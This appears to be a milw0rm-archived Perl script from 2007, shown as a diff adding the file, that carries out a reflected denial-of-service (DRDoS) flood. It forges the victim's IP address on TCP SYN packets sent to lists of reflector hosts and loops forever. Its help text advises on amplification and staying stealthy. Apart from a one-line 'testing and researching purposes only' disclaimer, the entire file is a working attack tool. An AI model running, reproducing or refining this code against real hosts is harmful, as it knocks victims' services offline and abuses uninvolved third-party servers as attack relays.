@@ -1,0 +1,139 @@
+#!/usr/bin/perl
+
+#
+# ~written by whoppix (c) 2007~
+# This Piece of software may be freely (re-)distributed under the Terms of the LGPL.
+# for a short usage type ./script --help
+# this program requires: perl, Net::RawIP (depends on libpcap), Getopt::Long
+# (which should be shipped along with your perl core distribution)
+# if you want to gain a deeper understanding about how DRDoS works, have a look at:
+# http://www.grc.com/dos/drdos.htm
+# This program is written for testing and researching purposes only.
+#
+
+use warnings;
+use strict;
+use Net::RawIP;
+use Getopt::Long;
+
+my $verbose   = '0';
+my $syn_count = '1';
+my $victim    = '127.0.0.1';
+my @lists     = ();
+my $net       = new Net::RawIP;
+
+GetOptions(
+	'verbose+'    => \$verbose,
+	'syn_count=s' => \$syn_count,
+	'list=s'      => \@lists,
+	'help'        => \&usage,       
+);
+$victim = shift @ARGV;
+if ( !$victim ) {
+	die "Error: No target specified, use --help\n";
+}
+if ( !@lists ) {
+	die "Error: You have to specify at least one reflector list, use --help\n";
+}
+foreach my $file (@lists) {
+	if ( !-e $file ) {
+		die "File does not seem to exist: $file\n";
+	}
+}
+print "Starting attack on target $victim.\n";
+print "press Ctrl-C to interrupt at any time.\n" if $verbose >= 1;
+while (1) {
+	foreach my $listfile (@lists) {
+		print "Loading reflector file: $listfile\n" if $verbose >= 1;
+		open( my $list, "<", $listfile )
+			or die "Error opening file for reading: $listfile\n";
+		while (<$list>) {
+			chomp;
+			if ( check_format($_) ) {
+				my $counter   = $syn_count;
+				my $reflector = $_;
+				my ( $ip, $port ) = split( ':', $reflector );
+				print "reflector ip: $ip, reflector port: $port\n"
+					if $verbose > 1;
+				for ( my $counter = $syn_count; $counter > 0; $counter-- ) {
+					print "attacking using reflector: $reflector\n"
+						if $verbose > 1;
+					my $rand = int( rand(65535) );
+					while ( $rand == 0 ) {
+						print
+							"random number calculated for SRCPORT was zero, retrying...\n"
+							if $verbose > 1;
+						$rand = int( rand(65535) );
+					}
+					print "random port used for SRCPORT: $rand\n"
+						if $verbose > 1;
+					$net->set(
+						{   ip => {
+								saddr => $victim,
+								daddr => $ip,
+							},
+							tcp => {
+								source => $rand,
+								dest   => $port,
+								syn    => 1,
+							},
+						}
+					);
+					$net->send();
+				}
+			}
+			else {
+				print
+					"mirror \"$_\" not in correct format (ip:port) omitting...\n"
+					if $verbose >= 1;
+			}
+		}
+	}
+}
+
+sub usage {
+	print "\nusage:\n\n";
+	print "--help\t\t: youre reading it\n";
+	print
+		"--verbose\t: makes the script more verbose. can be used several times to increase verbosity.\n";
+	print "--list\t\t: used to specify a reflectorlist.\n";
+	print
+		"\t\texample: ./script --list list1.txt --list list2.txt --list list3.txt 127.0.0.1\n";
+	print
+		"\t\tthe more (and longer) lists you have, the better will the result be, and the more stealth you will gain.\n";
+	print
+		"--syn_count\t: used to set the syn_count to a special value. default is 1.\n";
+	print "\t\tdon't use too much - that would decrease your stealth. Default (and that should be fine) is 1.\n";
+	print "\nGeneral information:\n";
+	print "The usage of multiple lists can increase your stealth.\n";
+	print "The more Mirrors or \"reflectors\" you use, the better will the result be.\n";
+	print "The better the bandwidth of your mirrors is, the better will the result be.\n";
+	print "Generally spoken is the bandwidth you use to flood your victim amplified by the factor 3-4.\n\n";
+	die "\n";
+}
+
+sub check_format {    # a function to check the ip:port format.
+	no warnings;
+	my $address = shift;
+	my ( $ip, $port ) = split( ':', $address );
+	my @octets = split( '\.', $ip );
+
+	if ( $port < 1 or $port > 65535 ) {
+		print "port $port too high or low\n" if $verbose >= 1;
+		return;
+	}
+	if ( @octets != 4 ) {
+		print "ip has invalid number of octetts: $ip\n" if $verbose >= 1;
+		return;
+	}
+	foreach my $octet (@octets) {
+		if ( $octet < 0 or $octet > 255 ) {
+			print "octet is invalid: $octet\n" if $verbose >= 1;
+			return;
+		}
+	}
+	print "VALID!\n" if $verbose > 1;
+	return 1;
+}
+
+# milw0rm.com [2007-06-06]
